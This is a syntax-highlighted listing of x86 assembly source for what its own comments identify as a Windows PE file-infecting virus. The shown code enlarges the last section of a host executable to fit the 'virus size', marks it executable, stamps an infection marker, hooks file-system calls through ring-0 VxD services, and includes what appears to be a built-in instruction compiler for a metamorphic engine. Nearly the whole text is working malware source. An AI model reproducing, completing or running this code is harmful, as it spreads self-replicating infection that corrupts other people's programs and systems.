        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">                         </span><span class="sc1">; safety</span><span class="sc0">



        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">PE_ObjectAlign</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; object align</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        
        </span><span class="sc9">.if</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">&gt;[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">Obj_VirtualSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; save new virtual size</span><span class="sc0">
        </span><span class="sc9">.endif</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">Obj_PhysicalSize</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; physical size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; add with virus size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">                          </span><span class="sc1">; safety</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">PE_FileAlign</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; file align</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">Obj_PhysicalSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; save new physical size</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'y3k?'</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">LastObjectPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0c0000040h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">Obj_Flags</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">PE_ImageSize</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; size of image</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">VirusSize</span><span class="sc0">                   </span><span class="sc1">; add with virussize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">PE_ObjectAlign</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; object aligment</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                             </span><span class="sc1">; new size of image in eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">PE_ImageSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">          </span><span class="sc1">; save it</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">PEHeadOfs</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; write to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">HeaderSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIOWrite</span><span class="sc0">

</span><span class="sc5">FileFunctionEndAddEsp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">R0_FreeMem</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">FileFunctionEndCloseFile</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIOHandle</span><span class="sc0">

</span><span class="sc5">FileFunctionEnd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">Flag</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">CallInOurFunction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">OldAPIFunction</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">


        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ReturnFromHook</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">ReturnFromHook</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ReturnFromHook</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc0">
  </span><span class="sc5">ReturnFromHook</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

















</span><span class="sc1">; ------------------------------</span><span class="sc0">
</span><span class="sc1">; --------------------- Compiler        </span><span class="sc0">
</span><span class="sc1">; ------------------------------</span><span class="sc0">

</span><span class="sc5">PointerToRandomMemory</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">MemorySize</span><span class="sc0">

</span><span class="sc5">PointerToDataSlack</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SavedOffsets</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">InstructionTable</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_add</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_and</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_cmp</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_or</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_sub</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_xor</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_mov</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_jmp</span><span class="sc0">

</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_jnz</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_jnb</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_jna</span><span class="sc0">


</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_offset</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">Op_db</span><span class="sc0">
</span><span class="sc5">InstructionTableEnd</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">InstructionTables</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">AddTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">DefaultProc1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00000100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000b</span><span class="sc0">

</span><span class="sc5">AndTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">DefaultProc1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00100000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00100100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">100b</span><span class="sc0">

</span><span class="sc5">CmpTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">DefaultProc1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00111000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00111100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">111b</span><span class="sc0">

</span><span class="sc5">OrTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">DefaultProc1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00001000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00001100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001b</span><span class="sc0">

</span><span class="sc5">SubTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">DefaultProc1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00101000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00101100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">101b</span><span class="sc0">

</span><span class="sc5">XorTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">DefaultProc1</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00110000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00110100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">110b</span><span class="sc0">

</span><span class="sc5">MovTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">MoveProc</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10001000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">11000110b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">10111000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000b</span><span class="sc0">


</span><span class="sc5">JmpTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">JmpProc</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">JnzTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">JxxProc</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0101b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">JnbTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">JxxProc</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0011b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">JnaTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">JxxProc</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0110b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">



</span><span class="sc5">OffsetTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">OffsetProc</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">DeclareByteTable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">DeclareByteProc</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">






</span><span class="sc5">ToValue</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ToTypeOfValue</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">SecondValue</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SecondTypeOfValue</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">




</span><span class="sc5">Instruction</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">InstructionLength</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">RegistersBitValue</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">IntelEax</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000b</span><span class="sc0">
</span><span class="sc5">IntelEbx</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">011b</span><span class="sc0">
</span><span class="sc5">IntelEcx</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">001b</span><span class="sc0">
</span><span class="sc5">IntelEdx</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">010b</span><span class="sc0">
</span><span class="sc5">IntelEsi</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">110b</span><span class="sc0">
</span><span class="sc5">IntelEdi</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">111b</span><span class="sc0">
</span><span class="sc5">IntelEsp</span><span class="sc0">                </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">100b</span><span class="sc0">


   </span><span class="sc5">ReadInstruction1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">InstructionTable</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,(</span><span class="sc5">InstructionTableEnd</span><span class="sc4">-</span><span class="sc5">InstructionTable</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">0fffffff0h</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">bswap</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc0">
        
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">repnz</span><span class="sc0">   </span><span class="sc6">scasd</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc5">InstructionTables</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CompileEnd</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">





   </span><span class="sc5">ReadOperands</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetOperand</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ToValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">ToTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">','</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Return</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetOperand</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SecondValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SecondTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">












</span><span class="sc5">SetDirectionBit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WhatOperandIsRegMem</span><span class="sc0">
        </span><span class="sc6">setl</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc5">Instruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">GetOther</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WhatOperandIsRegMem</span><span class="sc0">
        </span><span class="sc6">jnl</span><span class="sc0">     </span><span class="sc5">Label40</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ToValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ToTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetRegMem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WhatOperandIsRegMem</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">Label40</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ToValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">ToTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

    </span><span class="sc5">Label40</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">SecondValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">SecondTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

   
</span><span class="sc5">RegMem_Reg</span><span class="sc0">                      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">RegMem_Immediate</span><span class="sc0">                </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">Eax_Immediate</span><span class="sc0">                   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">


</span><span class="sc5">FetchOpcode</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetRegMem</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">setz</span><span class="sc0">    </span><span class="sc8">bl</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">setz</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc0">
